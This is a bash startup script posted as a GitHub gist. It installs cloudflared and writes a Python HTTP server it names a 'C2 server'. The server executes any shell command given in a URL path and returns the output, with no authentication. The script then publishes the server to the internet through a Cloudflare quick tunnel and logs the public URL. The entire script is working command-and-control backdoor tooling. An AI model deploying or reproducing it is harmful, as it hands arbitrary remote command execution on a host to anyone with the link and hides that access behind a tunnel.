#date: 2025-10-20T17:13:55Z
#url: https://api.github.com/gists/63c5465925d5833081b829f69cb671c1
#owner: https://api.github.com/users/aozq

#!/bin/bash
# Working onstart with HTTP server + Cloudflare tunnel

echo "WORKING START: $(date)" > /tmp/working_start.log

# Install pip3 and websockets
echo "Installing dependencies..." >> /tmp/working_start.log
apt-get update -y >> /tmp/working_start.log 2>&1
apt-get install -y python3-pip curl >> /tmp/working_start.log 2>&1
pip3 install websockets >> /tmp/working_start.log 2>&1

# Install cloudflared
echo "Installing cloudflared..." >> /tmp/working_start.log
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -O /tmp/cf.deb >> /tmp/working_start.log 2>&1
dpkg -i /tmp/cf.deb >> /tmp/working_start.log 2>&1

# Create HTTP C2 server
echo "Creating HTTP C2 server..." >> /tmp/working_start.log
cat > /tmp/c2_server.py << 'EOF'
import http.server
import socketserver
import subprocess
import urllib.parse

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/cmd/'):
            cmd = urllib.parse.unquote(self.path[5:])
            try:
                res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                out = res.stdout + res.stderr
                self.send_response(200)
                self.end_headers()
                self.wfile.write(out.encode())
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"Error: {e}".encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"C2 Server Running")

PORT = 8888
print(f"Starting C2 server on 0.0.0.0:{PORT}")
with socketserver.TCPServer(("0.0.0.0", PORT), C2Handler) as httpd:
    httpd.serve_forever()
EOF

# Start HTTP C2 server
echo "Starting HTTP C2 server..." >> /tmp/working_start.log
python3 /tmp/c2_server.py > /tmp/c2_server.log 2>&1 &
echo "C2 PID: $!" >> /tmp/working_start.log

# Wait for server to start
sleep 3

# Start Cloudflare tunnel
echo "Starting Cloudflare tunnel..." >> /tmp/working_start.log
cloudflared tunnel --url http://localhost:8888 --logfile /tmp/cloudflared.log > /tmp/tunnel.log 2>&1 &
echo "Cloudflare PID: $!" >> /tmp/working_start.log

# Wait for tunnel URL
echo "Waiting for tunnel URL..." >> /tmp/working_start.log
sleep 10
if [ -f /tmp/tunnel.log ]; then
    grep -o 'https://.*\.trycloudflare\.com' /tmp/tunnel.log | head -1 > /tmp/tunnel_url.txt
    echo "Tunnel URL:" >> /tmp/working_start.log
    cat /tmp/tunnel_url.txt >> /tmp/working_start.log
fi

echo "WORKING START COMPLETE: $(date)" >> /tmp/working_start.log
